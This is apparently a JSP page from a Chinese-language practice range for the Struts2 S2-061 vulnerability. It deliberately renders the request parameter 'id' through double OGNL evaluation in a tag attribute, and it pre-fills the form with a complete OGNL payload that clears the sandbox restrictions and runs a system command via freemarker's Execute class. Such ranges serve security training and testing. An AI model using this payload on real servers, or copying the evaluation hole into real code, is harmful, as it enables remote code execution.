<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-061 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea, .field input { width: 100%; box-sizing: border-box; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; color: #1d2a35; font: 14px/1.6 Consolas, monospace; }
        .field textarea { min-height: 160px; resize: vertical; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }

    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-061 靶场</h1>
        <p>这个模块延续 S2-059 的双重评估场景，但页面更适合用 <code>multipart/form-data</code> 提交 <code>id</code>，模拟 BeanMap + InstanceManager 的沙盒绕过链。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset()">填充官方风格 Payload</button>
        </div>
        <p>当前请求参数 id：<code><s:property value="id"/></code></p>
        <s:textfield id="%{id}" name="probe" label="危险标签渲染位"/>
        <s:form action="index" method="post" enctype="multipart/form-data">
            <s:textfield id="idField" name="id" label="id"/>
            <s:submit value="用 multipart 提交"/>
        </s:form>
        <div class="field">
            <label for="payloadBox">参考 Payload</label>
            <textarea id="payloadBox">%{(#instancemanager=#application['org.apache.tomcat.InstanceManager']).(#stack=#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack']).(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).(#bean.setBean(#stack)).(#context=#bean.get('context')).(#bean.setBean(#context)).(#macc=#bean.get('memberAccess')).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance('java.util.HashSet')).(#bean.put('excludedClasses',#emptyset)).(#bean.put('excludedPackageNames',#emptyset)).(#arglist=#instancemanager.newInstance('java.util.ArrayList')).(#arglist.add('id')).(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).(#execute.exec(#arglist))}</textarea>
        </div>
    </div>
</div>
<script>
    function fillPreset() { document.getElementById('idField').value = document.getElementById('payloadBox').value; }
    fillPreset();
</script>
</body>
</html>
